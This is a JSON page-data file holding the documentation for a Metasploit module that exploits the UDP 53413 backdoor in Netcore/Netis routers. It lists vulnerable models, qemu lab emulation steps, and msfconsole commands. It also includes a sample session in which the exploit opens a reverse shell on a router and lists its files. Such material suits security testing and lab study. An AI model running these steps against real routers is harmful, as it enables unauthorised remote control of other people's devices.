{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/linux/misc/netcore_udp_53413_backdoor","result":{"data":{"moduleMetadataJson":{"id":"9eda29bb-0ec4-5e23-91df-5ba7e6ff8b5e","name":"Netcore Router Udp 53413 Backdoor","fullname":"exploit/linux/misc/netcore_udp_53413_backdoor","description":"Routers manufactured by Netcore, a popular brand for networking\n        equipment in China, have a wide-open backdoor that can be fairly\n        easily exploited by attackers. These products are also sold under\n        the Netis brand name outside of China. This backdoor allows\n        cyber criminals to easily run arbitrary code on these routers,\n        rendering it vulnerable as a security device.\n        Some models include a non-standard echo command which doesn't\n        honor -e, and are therefore not currently exploitable with\n        Metasploit.  See URLs or module markdown for additional options.","rank":300,"fields":{"detailsSlug":"/modules/details/exploit/linux/misc/netcore_udp_53413_backdoor","documentationSlug":"/modules/documentation/exploit/linux/misc/netcore_udp_53413_backdoor","referencesSlug":"/modules/references/exploit/linux/misc/netcore_udp_53413_backdoor"},"documentation":{"html":"<h3 id=\"vulnerable-devices\" style=\"position:relative;\"><a href=\"#vulnerable-devices\" aria-label=\"vulnerable devices permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Devices</h3>\n<p>Trend Micro lists \"almost all\" models as being vulnerable in August 2014.</p>\n<p>Vulnerable AND Exploitable:</p>\n<ol>\n<li>Netcore NI360 second-generation</li>\n</ol>\n<p>Vulnerable, but not Exploitable via this module (details later):</p>\n<ol>\n<li>Netis WF2414 firmware V1.4.27001</li>\n</ol>\n<h3 id=\"lab-emulation\" style=\"position:relative;\"><a href=\"#lab-emulation\" aria-label=\"lab emulation permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Lab Emulation</h3>\n<ol>\n<li>Install qemu</li>\n<li>Download and install mipsel.  Please read the <a href=\"https://people.debian.org/%7Eaurel32/qemu/mipsel/README.txt\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">tutorial</a></li>\n<li>Starts the mipsel lab</li>\n<li><code class=\"language-text\">qemu-system-mipsel -M malta -kernel vmlinux-3.2.0-4-4kc-malta -hda debian_wheezy_mipsel_standard.qcow2 -append &quot;root=/dev/sda1 console=tty0&quot; -net nic -net user,hostfwd=tcp::22222-:22,hostfwd=udp::53413-:53413</code></li>\n<li>Put <a href=\"https://github.com/rapid7/metasploit-framework/files/267284/vuln_squashfs-root.tar.gz\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">vuln_squashfs-root.tar.gz</a> to mipsel lab, extract it.</li>\n<li><code class=\"language-text\">scp -P22222 vuln_squashfs-root.tar.gz root@127.0.0.1:/root</code></li>\n<li><code class=\"language-text\">tar xvf vuln_squashfs-root.tar.gz</code></li>\n<li>Run vuln programs.</li>\n<li><code class=\"language-text\">cd nw614 &amp;&amp; chroot . /bin/igdmptd</code></li>\n</ol>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ol>\n<li>Install the emulator/hardware</li>\n<li>Start msfconsole</li>\n<li>Do: <code class=\"language-text\">use exploits/linux/misc/netcore_udp_53413_backdoor</code></li>\n<li>Do: <code class=\"language-text\">set RHOST &lt;ip&gt;</code></li>\n<li>Do: <code class=\"language-text\">check</code></li>\n<li>Do: <code class=\"language-text\">exploit</code></li>\n<li>You should get a shell.</li>\n</ol>\n<h2 id=\"exploitability\" style=\"position:relative;\"><a href=\"#exploitability\" aria-label=\"exploitability permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Exploitability</h2>\n<p>As previously noted, some modules are vulnerable, but not currently exploitable via Metasploit.\nDuring <a href=\"https://github.com/rapid7/metasploit-framework/pull/6880#issuecomment-231597626\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">testing</a> it was discovered that some modules implement an echo command that does not honor -ne.  While it may be possible to still execute a shell, further investigation would need to be conducted.\nIn these cases, it should be possible to use <a href=\"https://github.com/h00die/MSF-Testing-Scripts/blob/master/netis_backdoor.py\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">other scripts</a> to act as a fake interactive shell.</p>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<p>The following is an example of a vulnerable AND EXPLOITABLE router.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">use exploits/linux/misc/netcore_udp_53413_backdoor\nmsf exploit(netcore_udp_53413_backdoor) &gt; set RHOST 192.168.1.1\nRHOST =&gt; 192.168.1.1\nmsf exploit(netcore_udp_53413_backdoor) &gt; check\n[+] The target is vulnerable.\nmsf exploit(netcore_udp_53413_backdoor) &gt; run\n\n[*] Started reverse TCP handler on 192.168.1.2:4444\n[*] Exploiting...\n[*] Command Stager progress -  12.54% done (196/1563 bytes)\n[*] Command Stager progress -  25.08% done (392/1563 bytes)\n[*] Command Stager progress -  37.62% done (588/1563 bytes)\n[*] Command Stager progress -  50.16% done (784/1563 bytes)\n[*] Command Stager progress -  62.70% done (980/1563 bytes)\n[*] Command Stager progress -  75.24% done (1176/1563 bytes)\n[*] Command Stager progress -  87.78% done (1372/1563 bytes)\n[*] Command Stager progress - 100.00% done (1563/1563 bytes)\n[*] Command shell session 1 opened (192.168.1.2:4444 -&gt; 192.168.1.1:54180) at 2016-05-16 00:52:43 -0500\n\npwd\n/\nls\nbin\ncfg\ndev\netc\nlib\nlinuxrc\nlog\nproc\nsbin\nsh\nsys\ntmp\nusr\nvar\nweb</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>The following is an example of a vulnerable but NOT expoitable router.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf &gt; use exploits/linux/misc/netcore_udp_53413_backdoor\nmsf exploit(netcore_udp_53413_backdoor) &gt; set rhost 192.168.1.1\nrhost =&gt; 192.168.1.1\nmsf exploit(netcore_udp_53413_backdoor) &gt; check\n\n[+] Backdoor Unlocked\n[*] Router backdoor triggered, but non-exploitable echo command detected.  Not currently exploitable with Metasploit.\n[*] The target service is running, but could not be validated.</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"9eda29bb-0ec4-5e23-91df-5ba7e6ff8b5e"}}}